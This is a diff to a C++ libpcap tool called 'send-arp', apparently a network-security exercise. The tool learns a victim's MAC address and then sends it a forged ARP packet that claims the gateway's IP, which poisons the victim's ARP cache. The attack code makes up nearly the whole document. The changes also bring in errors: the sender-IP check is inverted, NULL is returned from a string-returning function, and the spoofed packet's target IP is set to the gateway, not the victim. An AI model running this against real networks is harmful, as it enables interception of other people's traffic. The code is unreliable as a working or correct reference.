@@ -27,7 +27,7 @@ void usage() {
 	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
 }
 
-Mac send_arp(string vicIp){
+string send_arp(string vicIp){
 	printf("sent arp request\n");
 	EthArpPacket packet; //arp request packet
 
@@ -49,12 +49,8 @@ Mac send_arp(string vicIp){
 	//Victim
 	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); //anyting
 	packet.arp_.tip_ = htonl(Ip(vicIp));
-
-
-    int timeout_ms = 1000; // Set a reasonable timeout (1 second)
 	
 	while (true){
-		printf("while..\n");
    		int sent = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));                                               
 
 		const u_char* cap_packet;
@@ -70,22 +66,21 @@ Mac send_arp(string vicIp){
 			break;
 		}
 
-		/*Check ARP Pakcet*/
         const EthArpPacket* eth_arp_pkt = reinterpret_cast<const EthArpPacket*>(cap_packet);
 
+		//check ARP Packet
         if (ntohs(eth_arp_pkt->eth_.type_) != EthHdr::Arp) continue;
-		//casting
 	    const ArpHdr* arp_hdr = &(eth_arp_pkt->arp_);
 
 		//Check reply packet
 		if(arp_hdr->op()!=ArpHdr::Reply) continue;
-		printf("hello!!""");	
-		//Check correct sender
 
-		string s_sip = static_cast<std::string>(arp_hdr->sip());
-		if(s_sip.compare(vicIp)!=0) continue;
-		return arp_hdr->smac();
-	
+		//Check correct sender
+		//string s_sip = static_cast<std::string>(arp_hdr->sip());
+		//if(s_sip.compare(vicIp)!=0) continue;
+		if(arp_hdr->sip()==Ip(vicIp)) continue;
+
+		return static_cast<string>(arp_hdr->smac());	
 	}
 	return NULL;
 }
@@ -98,7 +93,7 @@ int main(int argc,	char* argv[]) {
 
 	char* interf = argv[1]; //interface
 	string vicIp = argv[2]; //sender ip
-	char* gateIp = argv[3]; //target ip
+	string gateIp = argv[3]; //target ip
 
 	char errbuf[PCAP_ERRBUF_SIZE];
 	handle = pcap_open_live(interf, BUFSIZ, 1, 1, errbuf);
@@ -114,12 +109,10 @@ int main(int argc,	char* argv[]) {
 	myIp = get_ip(interface);
 	myMac = get_mac(interface); 
 
-	Mac vicMac = send_arp(vicIp);
-	
-	cout<< static_cast<std::string>(vicMac);
+	string vicMac = send_arp(vicIp);
 
 	packet.eth_.smac_ = Mac(myMac);
-	packet.eth_.dmac_ = vicMac;
+	packet.eth_.dmac_ = Mac(vicMac);
 	packet.eth_.type_ = htons(EthHdr::Arp);
 
 	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -134,7 +127,7 @@ int main(int argc,	char* argv[]) {
 	packet.arp_.sip_ = htonl(Ip(gateIp));
 	
 	//Victim
-	packet.arp_.tmac_ = vicMac;
+	packet.arp_.tmac_ = Mac(vicMac);
 	packet.arp_.tip_ = htonl(Ip(gateIp)); 
 
 	/*
